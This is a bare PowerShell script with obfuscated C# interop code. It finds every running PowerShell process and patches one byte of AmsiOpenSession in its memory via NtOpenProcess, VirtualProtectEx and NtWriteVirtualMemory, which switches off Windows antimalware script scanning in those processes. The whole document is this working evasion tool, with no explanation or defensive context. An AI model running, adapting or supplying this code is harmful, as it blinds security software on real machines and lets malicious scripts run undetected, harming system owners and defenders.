$src = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace A {
    public class B {
        public const int A1 = 0x8, A2 = 0x10, A3 = 0x20;
        public const uint P = 0x40;

        [DllImport("ntdll.dll")]
        public static extern int NtOpenProcess(out IntPtr h, uint a, ref G b, ref I c);

        [DllImport("ntdll.dll")]
        public static extern int NtWriteVirtualMemory(IntPtr h, IntPtr a, byte[] b, uint c, out uint d);

        [DllImport("ntdll.dll")]
        public static extern int NtClose(IntPtr h);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string s);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr h, string s);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, UIntPtr b, uint c, out uint d);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct G {
        public int L;
        public IntPtr R1, R2, R3;
        public IntPtr S1, S2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct I {
        public IntPtr U1, U2;
    }
}
'@

Add-Type -TypeDefinition $src -Language CSharp

function p {
    param([int]$pid)
    $patch = [byte]0xEB
    $oa = New-Object A.G
    $cid = New-Object A.I
    $cid.U1 = [IntPtr]$pid
    $cid.U2 = [IntPtr]::Zero
    $oa.L = [Runtime.InteropServices.Marshal]::SizeOf($oa)
    $h = [IntPtr]::Zero
    $s = [A.B]::NtOpenProcess([ref]$h, [A.B]::A1 -bor [A.B]::A2 -bor [A.B]::A3, [ref]$oa, [ref]$cid)
    if ($s -ne 0) { return }
    $dll = [A.B]::LoadLibrary("amsi.dll")
    if ($dll -eq [IntPtr]::Zero) { [A.B]::NtClose($h); return }
    $addr = [A.B]::GetProcAddress($dll, "AmsiOpenSession")
    if ($addr -eq [IntPtr]::Zero) { [A.B]::NtClose($h); return }
    $target = [IntPtr]($addr.ToInt64() + 3)
    $old = [UInt32]0
    $sz = [UIntPtr]::op_Explicit(1)
    $ok = [A.B]::VirtualProtectEx($h, $target, $sz, [A.B]::P, [ref]$old)
    if (-not $ok) { [A.B]::NtClose($h); return }
    $w = [UInt32]0
    [A.B]::NtWriteVirtualMemory($h, $target, [byte[]]@($patch), 1, [ref]$w)
    [A.B]::VirtualProtectEx($h, $target, $sz, $old, [ref]$old)
    [A.B]::NtClose($h)
}

function q {
    Get-Process | ? { $_.ProcessName -eq "powershell" } | % { p -pid $_.Id }
}

q
